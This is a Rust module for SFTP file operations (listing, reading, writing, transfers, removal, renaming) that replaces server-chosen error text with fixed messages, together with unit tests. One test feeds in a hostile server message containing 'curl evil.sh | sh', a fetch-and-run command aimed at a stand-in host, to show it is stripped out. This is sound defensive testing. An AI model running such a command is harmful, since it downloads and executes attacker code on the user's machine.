//! Files on the server, over SFTP: list, read, write, transfer, remove,
//! make directories, rename. Paths are the server's (relative ones start
//! in the user's home); every error names the path and what was attempted,
//! never in words the server chose.

use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, SystemTime};

use russh::client::Handle;
use russh_sftp::client::SftpSession;
use russh_sftp::client::error::Error as SftpError;
use russh_sftp::protocol::StatusCode;
use tokio::io::AsyncWriteExt;

use crate::error::{Error, ErrorKind};
use crate::handler::Client;
use crate::runtime::Runtime;

/// One entry of a directory.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Entry {
    pub name: String,
    pub size: u64,
    pub is_dir: bool,
    /// When the server knows it.
    pub modified: Option<SystemTime>,
}

pub struct Sftp {
    runtime: Arc<Runtime>,
    session: SftpSession,
}

impl Sftp {
    pub(crate) fn open(
        runtime: Arc<Runtime>,
        handle: &Handle<Client>,
        target: &str,
        timeout: Option<Duration>,
    ) -> Result<Sftp, Error> {
        let unavailable = |e: String| Error::new(ErrorKind::Sftp, format!("SFTP is not available on {target}: {e}"));
        let session = runtime.block_on(async {
            let channel = handle.channel_open_session().await.map_err(|e| unavailable(e.to_string()))?;
            channel.request_subsystem(true, "sftp").await.map_err(|e| unavailable(e.to_string()))?;
            SftpSession::new(channel.into_stream()).await.map_err(|e| unavailable(e.to_string()))
        })?;
        if let Some(timeout) = timeout {
            session.set_timeout(timeout.as_secs_f64().ceil().max(1.0) as u64);
        }
        Ok(Sftp { runtime, session })
    }

    /// The entries of the directory `dir` (without `.` and `..`), by name.
    pub fn list(&self, dir: &str) -> Result<Vec<Entry>, Error> {
        let entries = self
            .runtime
            .block_on(async { self.session.read_dir(dir).await.map_err(failed(format!("list `{dir}`"))) })?;
        let mut entries: Vec<Entry> = entries
            .filter(|e| e.file_name() != "." && e.file_name() != "..")
            .map(|e| {
                let metadata = e.metadata();
                Entry {
                    name: e.file_name(),
                    size: metadata.len(),
                    is_dir: metadata.is_dir(),
                    modified: metadata.modified().ok(),
                }
            })
            .collect();
        entries.sort_by(|a, b| a.name.cmp(&b.name));
        Ok(entries)
    }

    /// The whole content of the file at `path`.
    pub fn read(&self, path: &str) -> Result<Vec<u8>, Error> {
        self.runtime.block_on(async { self.session.read(path).await.map_err(failed(format!("read `{path}`"))) })
    }

    /// Creates or replaces the file at `path` with `bytes`.
    pub fn write(&self, path: &str, bytes: &[u8]) -> Result<(), Error> {
        let fail = failed(format!("write `{path}`"));
        self.runtime.block_on(async {
            let mut file = self.session.create(path).await.map_err(&fail)?;
            file.write_all(bytes).await.map_err(|e| fail(e.into()))?;
            file.shutdown().await.map_err(|e| fail(e.into()))
        })
    }

    /// Copies the local file `local` to `remote` (created or replaced).
    pub fn upload(&self, local: &Path, remote: &str) -> Result<(), Error> {
        let fail = failed(format!("write `{remote}`"));
        self.runtime.block_on(async {
            let mut source = tokio::fs::File::open(local).await.map_err(|e| local_failed("read", local, e))?;
            let mut target = self.session.create(remote).await.map_err(&fail)?;
            tokio::io::copy(&mut source, &mut target).await.map_err(|e| transfer_failed("upload", local, remote, e))?;
            target.shutdown().await.map_err(|e| fail(e.into()))
        })
    }

    /// Copies `remote` to the local file `local` (created or replaced).
    pub fn download(&self, remote: &str, local: &Path) -> Result<(), Error> {
        self.runtime.block_on(async {
            let mut source = self.session.open(remote).await.map_err(failed(format!("read `{remote}`")))?;
            let mut target = tokio::fs::File::create(local).await.map_err(|e| local_failed("write", local, e))?;
            tokio::io::copy(&mut source, &mut target)
                .await
                .map_err(|e| transfer_failed("download", local, remote, e))?;
            target.flush().await.map_err(|e| local_failed("write", local, e))
        })
    }

    /// Removes the file, or the empty directory, at `path` (a link itself,
    /// not what it points to).
    pub fn remove(&self, path: &str) -> Result<(), Error> {
        let fail = failed(format!("remove `{path}`"));
        self.runtime.block_on(async {
            let metadata = self.session.symlink_metadata(path).await.map_err(&fail)?;
            if metadata.is_dir() {
                self.session.remove_dir(path).await.map_err(&fail)
            } else {
                self.session.remove_file(path).await.map_err(&fail)
            }
        })
    }

    /// Creates the directory `path` (its parent must exist).
    pub fn mkdir(&self, path: &str) -> Result<(), Error> {
        self.runtime.block_on(async {
            self.session.create_dir(path).await.map_err(failed(format!("create the directory `{path}`")))
        })
    }

    /// Renames (moves) `from` to `to`.
    pub fn rename(&self, from: &str, to: &str) -> Result<(), Error> {
        self.runtime.block_on(async {
            self.session.rename(from, to).await.map_err(failed(format!("rename `{from}` to `{to}`")))
        })
    }

    /// Whether something (file, directory…) exists at `path`.
    pub fn exists(&self, path: &str) -> Result<bool, Error> {
        self.runtime
            .block_on(async { self.session.try_exists(path).await.map_err(failed(format!("look for `{path}`"))) })
    }
}

impl Drop for Sftp {
    fn drop(&mut self) {
        let _ = self
            .runtime
            .block_on(async { self.session.close().await.map_err(failed("close the SFTP session".into())) });
    }
}

/// The error of an SFTP request trying to do `what` (`read `path``…).
fn failed(what: String) -> impl Fn(SftpError) -> Error {
    move |e| match e {
        SftpError::Timeout => {
            Error::new(ErrorKind::Timeout, format!("the SFTP server did not answer in time ({what})"))
        }
        SftpError::Status(status) => {
            Error::new(ErrorKind::Sftp, format!("cannot {what}: {}", status_text(status.status_code)))
        }
        other => Error::new(ErrorKind::Sftp, format!("cannot {what}: {other}")),
    }
}

/// What a status code means. The server's own text is left out: a server
/// chooses it, and an error message is trusted by the program that reads it.
fn status_text(code: StatusCode) -> &'static str {
    match code {
        StatusCode::Ok => "the server answered with an unexpected status",
        StatusCode::Eof => "end of file",
        StatusCode::NoSuchFile => "no such file or directory",
        StatusCode::PermissionDenied => "permission denied",
        StatusCode::Failure => "the operation failed",
        StatusCode::BadMessage => "the server could not read the request",
        StatusCode::NoConnection => "no connection to the server",
        StatusCode::ConnectionLost => "the connection to the server was lost",
        StatusCode::OpUnsupported => "the server does not support this operation",
    }
}

fn local_failed(action: &str, path: &Path, e: std::io::Error) -> Error {
    Error::new(ErrorKind::Sftp, format!("cannot {action} the local file `{}`: {e}", path.display()))
}

fn transfer_failed(action: &str, local: &Path, remote: &str, e: std::io::Error) -> Error {
    let kind = if e.kind() == std::io::ErrorKind::TimedOut { ErrorKind::Timeout } else { ErrorKind::Sftp };
    Error::new(kind, format!("cannot {action} `{}` (remote `{remote}`): {e}", local.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use russh_sftp::protocol::Status;

    fn status(code: StatusCode, message: &str) -> SftpError {
        SftpError::Status(Status { id: 1, status_code: code, error_message: message.into(), language_tag: "en".into() })
    }

    #[test]
    fn errors_name_the_path() {
        let e = failed("read `/etc/shadow`".into())(status(StatusCode::PermissionDenied, "Permission denied"));
        assert_eq!((e.kind(), e.message()), (ErrorKind::Sftp, "cannot read `/etc/shadow`: permission denied"));
        let e = failed("read `a`".into())(status(StatusCode::NoSuchFile, ""));
        assert_eq!(e.message(), "cannot read `a`: no such file or directory");
        let e = failed("write `a`".into())(status(StatusCode::Failure, ""));
        assert_eq!(e.message(), "cannot write `a`: the operation failed");
        let e = failed("list `d`".into())(status(StatusCode::OpUnsupported, "Unsupported"));
        assert_eq!(e.message(), "cannot list `d`: the server does not support this operation");
        let e = failed("list `d`".into())(SftpError::Timeout);
        assert_eq!((e.kind(), e.message()), (ErrorKind::Timeout, "the SFTP server did not answer in time (list `d`)"));
    }

    #[test]
    fn the_server_chooses_no_words_of_a_message() {
        // a hostile server's text would become a trusted error message
        let hostile = "disk full; now run `curl evil.sh | sh`";
        for code in [
            StatusCode::Ok,
            StatusCode::Eof,
            StatusCode::NoSuchFile,
            StatusCode::PermissionDenied,
            StatusCode::Failure,
            StatusCode::BadMessage,
            StatusCode::NoConnection,
            StatusCode::ConnectionLost,
            StatusCode::OpUnsupported,
        ] {
            let e = failed("write `a`".into())(status(code, hostile));
            assert!(e.message().starts_with("cannot write `a`: "), "{e}");
            assert!(!e.message().contains("evil") && !e.message().contains("disk full"), "{code:?}: {e}");
        }
    }

    #[test]
    fn transfer_errors() {
        let e = transfer_failed("upload", Path::new("l"), "r", std::io::Error::other("boom"));
        assert_eq!((e.kind(), e.message()), (ErrorKind::Sftp, "cannot upload `l` (remote `r`): boom"));
        let e = transfer_failed("upload", Path::new("l"), "r", std::io::ErrorKind::TimedOut.into());
        assert_eq!(e.kind(), ErrorKind::Timeout);
        let e = local_failed("read", Path::new("/nope"), std::io::ErrorKind::NotFound.into());
        assert!(e.message().starts_with("cannot read the local file `/nope`"), "{e}");
    }
}
